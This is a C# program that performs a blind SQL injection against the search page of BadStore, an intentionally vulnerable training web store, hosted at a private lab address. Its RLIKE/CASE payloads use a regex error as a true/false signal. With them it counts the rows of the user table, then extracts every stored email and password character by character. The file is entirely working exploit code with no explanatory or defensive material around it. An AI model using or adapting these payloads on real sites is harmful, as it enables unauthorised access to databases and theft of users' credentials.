using System;
using System.Net;
using System.Threading.Tasks;
using System.Text;
using System.Net.Http;
using System.Collections.Generic;
using System.Collections;

namespace getRowCountSQLinjection
{
    class Program
    {
        static async Task Main(string[] args)
        {
            int countLength = 1;
            for (;;countLength++) {
                string getCountLength = "f' RLIKE(SELECT(CASE WHEN((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20))FROM userdb)="+countLength+")THEN 0x28 ELSE 0x41 END))AND 'LeSo'='LeSo";

                string response = await MakeRequest(getCountLength);
                if (response.Contains("parentheses not balanced")) {
                    break;
                }
            }

            List<byte> countBytes = new List<byte>();
            for (int i = 1; i <= countLength; i++) {
                for (int c = 48; c <= 58; c++) {
                    string getCount = "f' RLIKE(SELECT(CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM badstoredb.userdb)," + i + ",1))="+c+") THEN 0x28 ELSE 0x41 END))AND 'LeSo'='LeSo";
                    string response = await MakeRequest(getCount);
                    if (response.Contains("parentheses not balanced")) {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }

            int rowCount = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            System.Console.WriteLine("There are "+rowCount+" rows in the userdb table.");

            for (int row = 1; row < rowCount; row++) {
                foreach (string column in new string[] {"email", "passwd"}) {
                    System.Console.WriteLine("Getting length of query value...");
                    int valueLength = await GetLength(row, column);
                    System.Console.WriteLine(valueLength);

                    System.Console.WriteLine("Getting value...");
                    string value = await GetValue(row, column, valueLength);
                    System.Console.WriteLine(value);
                }
            }

        }

        private static async Task<string> MakeRequest(string payload) {
            string url = "http://192.168.56.100/cgi-bin/badstore.cgi?action=search&searchquery=";

            HttpClient client = new HttpClient();

            string response = await client.GetStringAsync(url+payload);
            return response;
        }

        private static async Task<int> GetLength(int row, string column) {
            int countLength = 0;
            for (;;countLength++) {
                string getCountLength = "fdsa' RLIKE (SELECT(CASE WHEN((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+")AS CHAR),0x20))FROM userdb ORDER BY email LIMIT "+row+",1)="+countLength+") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";

                string response = await MakeRequest(getCountLength);

                if (response.Contains("parentheses not balanced")) {
                    break;
                }
            }

            List<byte> countBytes = new List<byte> ();
            for (int i = 0; i <= countLength; i++){
                for (int c = 48; c <= 58; c++) {
                    string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20) FROM userdb ORDER BY email LIMIT "+row+",1),"+i+",1))="+c+") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
                    string response = await MakeRequest(getLength);
                    if (response.Contains("parentheses not balanced")) {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }

            if (countBytes.Count > 0) {
                return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            } else {
                return 0;
            }

        }

        private static async Task<string> GetValue(int row, string column, int length) {
            List<byte> valueBytes = new List<byte>();
            for (int i = 0; i <= length; i++) {
                for (int c = 32; c <= 126; c++) {
                    string getCharacter = "fdsa' RLIKE(SELECT(CASE WHEN(ORD(MID((SELECT IFNULL(CAST("+column+" AS CHAR),0x20)FROM userdb ORDER BY email LIMIT "+row+",1),"+i+",1))="+c+")THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
                    string response = await MakeRequest(getCharacter);

                    if (response.Contains("parentheses not balanced")) {
                        valueBytes.Add((byte)c);
                        break;
                    }
                }
            }

            return Encoding.ASCII.GetString(valueBytes.ToArray());
        }
    }
}
